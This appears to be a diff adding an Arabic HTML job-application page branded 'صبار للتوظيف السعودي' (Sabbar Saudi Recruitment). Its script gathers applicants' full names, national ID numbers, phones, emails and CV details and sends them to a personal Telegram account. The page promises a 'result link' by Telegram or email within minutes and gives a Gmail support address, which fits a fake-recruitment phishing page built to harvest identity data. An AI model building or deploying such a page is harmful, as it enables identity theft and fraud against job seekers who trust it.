@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>صبار للتوظيف السعودي</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{
+    margin:0;
+    font-family:'Cairo', Arial, sans-serif;
+    direction:rtl;
+    background: radial-gradient(circle at top,#1b2a32,#0f2027);
+}
+.container{
+    max-width:760px;
+    margin:30px auto;
+    background:#ffffff;
+    border-radius:20px;
+    padding:25px;
+    box-shadow:0 10px 30px rgba(0,0,0,.4);
+    transition:.3s;
+}
+h1{
+    text-align:center;
+    color:#1e7f3b;
+    margin-bottom:10px;
+}
+.subtitle{
+    text-align:center;
+    font-size:14px;
+    color:#666;
+    margin-bottom:20px;
+}
+label{
+    font-weight:bold;
+    display:block;
+    margin-top:12px;
+}
+input, textarea, select{
+    width:100%;
+    padding:14px 12px;
+    margin-top:6px;
+    border-radius:10px;
+    border:1px solid #ccc;
+    font-size:16px;
+    transition:.3s;
+    box-sizing: border-box;
+}
+input:focus, textarea:focus, select:focus{
+    outline:none;
+    border-color:#1e7f3b;
+    box-shadow:0 0 6px rgba(30,127,59,.4);
+}
+textarea{
+    min-height:120px;
+    resize: vertical;
+}
+select{
+    height:45px;
+    font-size:16px;
+}
+.checkbox-group{
+    display:flex;
+    flex-wrap:wrap;
+    gap:10px;
+    margin-top:10px;
+}
+.checkbox-group label{flex:1 1 30%;}
+button{
+    width:100%;
+    margin-top:20px;
+    padding:15px;
+    font-size:18px;
+    font-weight:bold;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(135deg,#1e7f3b,#2ecc71);
+    color:#fff;
+    cursor:pointer;
+}
+button:hover{opacity:.9}
+.note{
+    margin-top:10px;
+    font-size:13px;
+    color:#777;
+}
+.note.alert{
+    margin-top:15px;
+    color:#d9534f;
+}
+.confirmation{
+    margin-top:20px;
+    padding:12px;
+    background:#d4edda;
+    border:1px solid #c3e6cb;
+    color:#155724;
+    border-radius:10px;
+    font-size:14px;
+    display:none;
+}
+.emergency{
+    margin-top:20px;
+    background:#f3f3f3;
+    padding:12px;
+    border-radius:10px;
+    font-size:14px;
+}
+.footer{
+    text-align:center;
+    margin-top:25px;
+    font-size:13px;
+    color:#777;
+}
+@media (max-width:480px){
+    .container{padding:15px; margin:15px;}
+    h1{font-size:22px;}
+    button{font-size:16px;}
+    input, textarea, select{font-size:15px; padding:12px;}
+    select{height:42px;}
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<h1>صبار للتوظيف السعودي</h1>
+<div class="subtitle">نموذج التقديم الرسمي للباحثين عن العمل داخل المملكة</div>
+
+<label>الاسم بالكامل</label>
+<input type="text" id="name" required>
+
+<label>رقم الهوية الوطنية (10 أرقام)</label>
+<input type="text" id="digitalID" maxlength="10" inputmode="numeric" placeholder="مثال: 1234567890">
+
+<label>رقم الهاتف</label>
+<input type="tel" id="phone" required>
+
+<label>البريد الإلكتروني</label>
+<input type="email" id="email" required>
+
+<label>الجنسية</label>
+<select id="nationality" required>
+    <option value="سعودي">سعودي</option>
+</select>
+
+<label>الوظيفة المطلوبة</label>
+<select id="job">
+    <option value="">اختر الوظيفة</option>
+    <option value="مدير مشروع">مدير مشروع</option>
+    <option value="مهندس برمجيات">مهندس برمجيات</option>
+    <option value="مسؤول تسويق">مسؤول تسويق</option>
+    <option value="محاسب">محاسب</option>
+    <option value="مصمم جرافيك">مصمم جرافيك</option>
+    <option value="موظف استقبال">موظف استقبال</option>
+    <option value="مهنة أخرى">مهنة أخرى</option>
+</select>
+
+<label>نبذة تعريفية</label>
+<textarea id="summary"></textarea>
+
+<label>الخبرات العملية</label>
+<textarea id="experience"></textarea>
+
+<label>المؤهل العلمي</label>
+<textarea id="education"></textarea>
+
+<label>المهارات</label>
+<textarea id="skills"></textarea>
+
+<label>🌐 اللغات (يمكن اختيار أكثر من لغة)</label>
+<div class="checkbox-group">
+    <label><input type="checkbox" value="العربية"> العربية</label>
+    <label><input type="checkbox" value="الإنجليزية"> الإنجليزية</label>
+    <label><input type="checkbox" value="الألمانية"> الألمانية</label>
+    <label><input type="checkbox" value="الفرنسية"> الفرنسية</label>
+    <label><input type="checkbox" value="الإسبانية"> الإسبانية</label>
+    <label><input type="checkbox" value="الإيطالية"> الإيطالية</label>
+</div>
+
+<label>📎 رفع السيرة الذاتية</label>
+<input type="file" id="cv">
+
+<div class="note">
+⚠️ بعد فتح تيليجرام، يرجى إرسال السيرة الذاتية داخل نفس المحادثة
+</div>
+
+<label>ملاحظات إضافية</label>
+<textarea id="notes"></textarea>
+
+<!-- الملحوظة باللهجة السعودية قبل زر الإرسال -->
+<div class="note alert">
+⚠️ طلبك بيتم مراجعته خلال 10 إلى 30 دقيقة، وراح يوصلك رابط النتيجة على التلجرام.
+</div>
+
+<button onclick="sendTelegram()">إرسال الطلب عبر تيليجرام</button>
+
+<div class="confirmation" id="confirmationMsg">
+✅ تم استلام طلبك! خلال 10 دقائق سيتم إرسال رابط على بريدك الإلكتروني للتحقق من قبولك أو رفضك.
+</div>
+
+<div class="emergency">
+📧 بريد الطوارئ والدعم: <strong>sabbar.support@gmail.com</strong>
+</div>
+
+<div class="footer">
+© جميع الحقوق محفوظة – صبار للتوظيف السعودي
+</div>
+
+</div>
+
+<script>
+document.getElementById("digitalID").addEventListener("input",function(){
+    this.value=this.value.replace(/[^0-9]/g,'').slice(0,10);
+});
+
+function sendTelegram(){
+    var name=document.getElementById("name").value.trim();
+    var id=document.getElementById("digitalID").value.trim();
+    var phone=document.getElementById("phone").value.trim();
+    var email=document.getElementById("email").value.trim();
+    var nationality=document.getElementById("nationality").value;
+
+    if(!name || id.length!==10 || !phone || !email){
+        alert("يرجى تعبئة الاسم ورقم الهوية (10 أرقام) ورقم الهاتف والبريد الإلكتروني");
+        return;
+    }
+
+    // التحقق من التقديم المكرر باستخدام LocalStorage
+    var applied = JSON.parse(localStorage.getItem("appliedList")||"[]");
+    if(applied.includes(id) || applied.includes(phone)){
+        alert("تم التقديم من قبل ونتمنى لك التوفيق في وظيفة أخرى");
+        return;
+    }
+
+    var langs=[];
+    document.querySelectorAll('.checkbox-group input:checked')
+        .forEach(e=>langs.push(e.value));
+
+    var msg=
+"📄 طلب توظيف جديد\n\n"+
+"👤 الاسم: "+name+"\n"+
+"🆔 الهوية: "+id+"\n"+
+"📱 الهاتف: "+phone+"\n"+
+"📧 الإيميل: "+email+"\n"+
+"🌏 الجنسية: "+nationality+"\n"+
+"🎯 الوظيفة: "+document.getElementById("job").value+"\n"+
+"🌐 اللغات: "+(langs.join(', ')||'غير محدد')+"\n\n"+
+"📝 نبذة:\n"+document.getElementById("summary").value+"\n\n"+
+"🏢 الخبرات:\n"+document.getElementById("experience").value+"\n\n"+
+"🎓 المؤهل:\n"+document.getElementById("education").value+"\n\n"+
+"⭐ المهارات:\n"+document.getElementById("skills").value+"\n\n"+
+"📎 السيرة الذاتية: "+(document.getElementById("cv").files[0]?.name||"لم يتم الرفع")+"\n\n"+
+"🗒 ملاحظات:\n"+document.getElementById("notes").value;
+
+    // فتح تيليجرام
+    window.open("https://t.me/Saud_Online?text="+encodeURIComponent(msg), "_blank");
+
+    // تخزين البيانات لمنع التقديم المكرر
+    applied.push(id);
+    applied.push(phone);
+    localStorage.setItem("appliedList", JSON.stringify(applied));
+
+    // إظهار رسالة التأكيد داخل الصفحة
+    var confirmation = document.getElementById("confirmationMsg");
+    confirmation.style.display = "block";
+}
+</script>
+
+</body>
+</html>
